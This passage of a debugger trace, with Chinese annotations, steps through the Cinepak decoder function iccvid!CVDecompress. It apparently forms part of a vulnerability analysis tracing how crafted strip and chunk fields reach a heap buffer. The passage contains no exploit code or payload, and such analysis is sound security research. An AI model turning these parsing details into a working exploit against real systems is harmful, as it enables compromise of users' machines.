class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xbf</span>:</span><br><span class="line">73b7226d 3c10            <span class="keyword">cmp</span>     <span class="built_in">al</span>,<span class="number">10h</span>                                         <span class="comment">; 判断Strip CVID ID的高位字节是否为0x10</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7226f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xc1</span>:</span><br><span class="line">73b7226f <span class="number">7408</span>            <span class="keyword">je</span>      iccvid!CVDecompress+<span class="number">0xcb</span> (73b72279)     [br=<span class="number">1</span>] <span class="comment">; 相等则跳转，这里跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000010</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72279 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xcb</span>:</span><br><span class="line">73b72279 8d4508          <span class="keyword">lea</span>     <span class="built_in">eax</span>,[<span class="built_in">ebp</span>+<span class="number">8</span>]                                    <span class="comment">; eax = 0x025afd38,a1地址,a1 = 0x001535b0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xce</span>:</span><br><span class="line">73b7227c <span class="number">50</span>              <span class="keyword">push</span>    <span class="built_in">eax</span>                                            <span class="comment">; arg3 = eax = 0x025afd38,保存减去Strip Header大小后的数据大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227d <span class="built_in">esp</span>=025afd00 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xcf</span>:</span><br><span class="line">73b7227d 6a0c            <span class="keyword">push</span>    <span class="number">0Ch</span>                                            <span class="comment">; arg2 = 0xC,Strip Header大小</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7227f <span class="built_in">esp</span>=025afcfc <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd1</span>:</span><br><span class="line">73b7227f ff75f8          <span class="keyword">push</span>    <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">8</span>]    <span class="built_in">ss</span>:<span class="number">0023</span>:025afd28=<span class="number">00000010</span> <span class="comment">; arg1 = 0x10,Size of strip data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=025afd38 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000010</span> <span class="built_in">edx</span>=<span class="number">00000010</span> <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72282 <span class="built_in">esp</span>=025afcf8 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd4</span>:</span><br><span class="line">73b72282 e8fffeffff      <span class="keyword">call</span>    iccvid!ULongSub (73b72186)                     <span class="comment">; 如果arg1&gt;=arg2,则返回0,且计算出减去Strip Header的大小后,剩余的数据大小,否则返回一个负数</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72287 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xd9</span>:</span><br><span class="line">73b72287 85c0            <span class="keyword">test</span>    <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = 0x0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72289 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xdb</span>:</span><br><span class="line">73b72289 0f8c65010000    <span class="keyword">jl</span>      iccvid!CVDecompress+<span class="number">0x246</span> (73b723f4)    [br=<span class="number">0</span>] <span class="comment">; 小于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7228f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe1</span>:</span><br><span class="line">73b7228f 33c0            <span class="keyword">xor</span>     <span class="built_in">eax</span>,<span class="built_in">eax</span>                                        <span class="comment">; eax = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72291 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe3</span>:</span><br><span class="line">73b72291 8a6608          <span class="keyword">mov</span>     <span class="number">ah</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">8</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba690a=<span class="number">00</span> <span class="comment">; ah = 0x00,Strips bottom Y position的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000004</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72294 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe6</span>:</span><br><span class="line">73b72294 33c9            <span class="keyword">xor</span>     <span class="built_in">ecx</span>,<span class="built_in">ecx</span>                                        <span class="comment">; ecx = ecx^ecx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72296 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xe8</span>:</span><br><span class="line">73b72296 8a6e04          <span class="keyword">mov</span>     <span class="number">ch</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">4</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6906=<span class="number">00</span> <span class="comment">; ch = 0x00,Strips top Y position的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b72299 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xeb</span>:</span><br><span class="line">73b72299 8a4609          <span class="keyword">mov</span>     <span class="built_in">al</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">9</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba690b=<span class="number">60</span> <span class="comment">; al = 0x60,Strips bottom Y position的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000060</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7229c <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xee</span>:</span><br><span class="line">73b7229c 8a4e05          <span class="keyword">mov</span>     <span class="built_in">cl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>+<span class="number">5</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6907=<span class="number">00</span> <span class="comment">; cl = 0x00,Strips top Y position的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000060</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b7229f <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf1</span>:</span><br><span class="line">73b7229f 2bc1            <span class="keyword">sub</span>     <span class="built_in">eax</span>,<span class="built_in">ecx</span>                                <span class="comment">; (Strips bottom Y position)-(Strips top Y position)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000060</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf3</span>:</span><br><span class="line">73b722a1 660faf432e      <span class="keyword">imul</span>    <span class="built_in">ax</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">2Eh</span>]    <span class="built_in">ds</span>:<span class="number">0023</span>:001535de=<span class="number">0001</span> <span class="comment">; ebx = a1 = 0x001535b0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000060</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xf8</span>:</span><br><span class="line">73b722a6 89450c          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd3c=00ba68f8 <span class="comment">; a2 = eax = 0x60 = [(Strips bottom Y position)-(Strips top Y position)]*1</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000060</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722a9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xfb</span>:</span><br><span class="line">73b722a9 8b45fc          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00000000</span> <span class="comment">; eax = 0x00000000,堆缓冲区指针偏移</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722ac <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0xfe</span>:</span><br><span class="line">73b722ac 3bc7            <span class="keyword">cmp</span>     <span class="built_in">eax</span>,<span class="built_in">edi</span>                                        <span class="comment">; 判断局部变量[ebp-4]是否为0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722ae <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x100</span>:</span><br><span class="line">73b722ae <span class="number">7421</span>            <span class="keyword">je</span>      iccvid!CVDecompress+<span class="number">0x123</span> (73b722d1)    [br=<span class="number">1</span>] <span class="comment">; 为0则跳转，这里跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722d1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x123</span>:</span><br><span class="line">73b722d1 8b7df4          <span class="keyword">mov</span>     <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd24=00ba6902 <span class="comment">; edi = [ebp-0xC] = 0x00ba6902,指向cinepak_codec_data2</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba6902</span><br><span class="line"><span class="built_in">eip</span>=73b722d4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x126</span>:</span><br><span class="line">73b722d4 8b4320          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">20h</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:001535d0=001535f8 <span class="comment">; ebx = a1 = 0x001535b0,eax = 0x001535f8,堆缓冲区数据区域首地址</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001535f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span class="built_in">edi</span>=00ba6902</span><br><span class="line"><span class="built_in">eip</span>=73b722d7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x129</span>:</span><br><span class="line">73b722d7 83c70c          <span class="keyword">add</span>     <span class="built_in">edi</span>,<span class="number">0Ch</span>                                        <span class="comment">; edi = edi+0xC = 0x00ba690e,指向第1个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001535f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6902 <span 